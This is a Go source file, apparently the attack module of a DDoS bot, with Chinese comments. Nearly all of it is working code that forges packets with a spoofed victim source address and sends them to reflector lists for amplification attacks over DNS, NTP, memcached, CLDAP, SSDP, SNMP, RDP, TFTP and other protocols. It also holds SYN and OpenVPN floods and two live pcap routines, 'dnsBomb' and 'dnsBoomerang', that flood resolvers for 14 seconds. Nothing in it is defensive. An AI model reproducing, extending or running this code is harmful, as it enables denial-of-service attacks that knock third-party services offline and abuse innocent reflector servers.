package attack

import (
	"bot/packetbuilder/protocol"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"time"
	"fmt"
)

// Layer4 结构体，用于存放攻击的相关信息
type Layer4 struct {
	Method          string			// 攻击方法
	
	SrcIP           string			// 源地址为空，则为本机IP
	SrcPort         int				// 源端口为空，则随机选取端口
	DstIP			string			// 目的地址为空，则查找服务器文件
	DstPort			int				// 目的端口为空，则发送到协议默认的端口号

	ThreadCount     int				// 攻击线程数
	AmpFile         string 			// 用于反射放大的服务器文件路径

	Reservedfield   string // 保留字段，存储某些放大攻击的额外信息
}


func (l *Layer4) udpPacket() ([][]byte, error) {
	var packets [][]byte

	if l.SrcIP == "" {
		// 不伪造IP直接发包
		_,srcip,err := protocol.FindInterface(l.DstIP)
		if err != nil {
			return nil, fmt.Errorf("生成 UDP 数据包失败: %v", err)
		}
		srcport := RandPort()
		udppacket, err := protocol.UDPPacket(srcip, l.DstIP, srcport, l.DstPort)
		packets = append(packets, udppacket)
	} else {
		// 生成单个指定源地址的数据包
		udppacket, err := protocol.UDPPacket(l.SrcIP, l.DstIP, l.SrcPort, l.DstPort)
		if err != nil {
			return nil, fmt.Errorf("生成 UDP 数据包失败: %v", err)
		}
		packets = append(packets, udppacket)
	}
	
	return packets, nil
}

func (l *Layer4) synPacket() ([][]byte, error) {
	var packets [][]byte

	if l.SrcIP == "" {
		for i := 0; i < 1000; i++ {
			synpacket, err := protocol.SYNPacket(RandIPv4(), l.DstIP, RandPort(), l.DstPort)
			if err != nil {
				return nil, fmt.Errorf("生成 SYN 数据包失败: %v", err)
			}
			packets = append(packets, synpacket)
		}
	} else {
		ampList, err := protocol.LoadIPList(l.AmpFile)
		if err != nil {
			return nil, fmt.Errorf("加载服务器文件失败: %v", err)
		}
		for _, refip := range ampList {
			synpacket, err := protocol.SYNPacket(l.DstIP, refip, l.DstPort, 80)
			if err != nil {
				return nil, fmt.Errorf("构造 SYN 数据包失败: %v", err)
			}
			packets = append(packets, synpacket)
		}
	}

	return packets, nil
}

func (l *Layer4) dnsaPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	dns := protocol.DNSQuery()
	dns.Questions[0].Name = []byte(l.Reservedfield)
	for _, refip := range ampList {
		dnspacket, err := protocol.DNSPacket(l.DstIP, refip, l.DstPort, 53, dns)
		if err != nil {
			return nil, fmt.Errorf("构造 DNS 数据包失败: %v", err)
		}
		packets = append(packets, dnspacket)
	}

	return packets, nil
}

func (l *Layer4) dnsnsPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	dns := protocol.DNSQuery()
	dns.Questions[0].Name = []byte(l.Reservedfield)
	dns.Questions[0].Type = layers.DNSTypeNS
	for _, refip := range ampList {
		dnspacket, err := protocol.DNSPacket(l.DstIP, refip, l.DstPort, 53, dns)
		if err != nil {
			return nil, fmt.Errorf("构造 DNS 数据包失败: %v", err)
		}
		packets = append(packets, dnspacket)
	}


	return packets, nil
}

func (l *Layer4) rdpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	for _, refip := range ampList {
		rdppacket, err := protocol.RDPPacket(l.DstIP, refip, l.DstPort, 3389)
		if err != nil {
			return nil, fmt.Errorf("构造 RDP 数据包失败: %v", err)
		}
		packets = append(packets, rdppacket)
	}

	return packets, nil
}

func (l *Layer4) cldapPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	for _, refip := range ampList {
		cldappacket, err := protocol.CLDAPPacket(l.DstIP, refip, l.DstPort, 389)
		if err != nil {
			return nil, fmt.Errorf("构造 CLDAP 数据包失败: %v", err)
		}
		packets = append(packets, cldappacket)
	}

	return packets, nil
}

func (l *Layer4) memcachedPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	for _, refip := range ampList {
		memcachedpacket, err := protocol.MEMCACHEDPacket(l.DstIP, refip, l.DstPort, 11211)
		if err != nil {
			return nil, fmt.Errorf("构造 Memcached 数据包失败: %v", err)
		}
		packets = append(packets, memcachedpacket)
	}

	return packets, nil
}

func (l *Layer4) ardPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	for _, refip := range ampList {
		ardpacket, err := protocol.ARDPacket(l.DstIP, refip, l.DstPort, 3283)
		if err != nil {
			return nil, fmt.Errorf("构造 ARD 数据包失败: %v", err)
		}
		packets = append(packets, ardpacket)
	}

	return packets, nil
}

func (l *Layer4) ntpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
	}

	for _, refip := range ampList {
		ntppacket, err := protocol.NTPPacket(l.DstIP, refip, l.DstPort, 123)
		if err != nil {
			return nil, fmt.Errorf("构造 NTP 数据包失败: %v", err)
		}
		packets = append(packets, ntppacket)
	}

	return packets, nil
}

// 在layer4.go中添加对应攻击方法（attack/layer4.go）
func (l *Layer4) ssdpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载SSDP服务器列表失败: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.SSDPPacket(l.DstIP, refip, l.DstPort, 1900)
		if err != nil {
			return nil, fmt.Errorf("构造SSDP包失败: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) chargenPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载Chargen服务器列表失败: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.ChargenPacket(l.DstIP, refip, l.DstPort, 19)
		if err != nil {
			return nil, fmt.Errorf("构造Chargen包失败: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) snmpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载SNMP服务器列表失败: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.SNMPPacket(l.DstIP, refip, l.DstPort, 161)
		if err != nil {
			return nil, fmt.Errorf("构造SNMP包失败: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) openvpnPacket() ([][]byte, error) {
	var packets [][]byte
	for i := 0; i < 500; i++ { // 生成大量变种包
		pkt, err := protocol.OpenVPNPacket(
			RandIPv4(),
			l.DstIP,
			RandPort(),
			1194,
		)
		if err != nil {
			return nil, fmt.Errorf("构造OpenVPN包失败: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) tftpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("加载TFTP服务器列表失败: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.TFTPPacket(l.DstIP, refip, l.DstPort, 69)
		if err != nil {
			return nil, fmt.Errorf("构造TFTP包失败: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) dnsBomb() ([][]byte, error) {
	resolver, err := protocol.LoadIPList("./serverfile/resolver.txt")
	if err != nil {
		return	nil, nil
	}

	interfaceName, _, err := protocol.FindInterface(resolver[0])
	if err != nil {
		fmt.Printf("没有可用的网络接口: %v\n", err)
		return	nil, nil
	}

	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("无法打开设备: %v\n", err)
		return	nil, nil
	}
	defer handle.Close()

	// 遍历发包14s,因为超时时间设置为15s
	tmp := time.Now().Add(14*time.Second)
	for time.Now().Before(tmp){
			query := protocol.DNSQuery()
	
			packet, err := protocol.DNSPacket(l.DstIP, resolver[0], l.DstPort, 53, query)
			if err != nil {
				return	nil, nil
			}
			
			if err := handle.WritePacketData(packet); err != nil {
				fmt.Printf("发送伪造数据包失败: %v\n", err)
				return	nil, nil
			}
		
	}


	return nil, nil
}

// 目标是DNS解析器，解析器IP存放在serverfile中
func (l *Layer4) dnsBoomerang() ([][]byte, error) {
	resolver, err := protocol.LoadIPList("./serverfile/resolver.txt")
	if err != nil {
		return	nil, nil
	}

	interfaceName, _, err := protocol.FindInterface(resolver[0])
	if err != nil {
		fmt.Printf("没有可用的网络接口: %v\n", err)
		return	nil, nil
	}

	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("无法打开设备: %v\n", err)
		return	nil, nil
	}
	defer handle.Close()

	// 第二层反射器，reflector的IP为源IP
	ampList, err := protocol.LoadIPList("./serverfile/reflector.txt")
	if err != nil {
		return	nil, nil
	}
	// 遍历发包14s,因为超时时间设置为15s
	tmp := time.Now().Add(14*time.Second)
	for time.Now().Before(tmp){
		for _, ip := range ampList {
			query := protocol.DNSQuery()
	
			packet, err := protocol.DNSPacket(ip, resolver[0], 53, 53, query)
			if err != nil {
				return	nil, nil
			}

			fmt.Println("源IP:",ip)
			fmt.Println("目的IP:",resolver[0])

			
			if err := handle.WritePacketData(packet); err != nil {
				fmt.Printf("发送伪造数据包失败: %v\n", err)
				return	nil, nil
			}

		}
	}

	return	nil, nil
}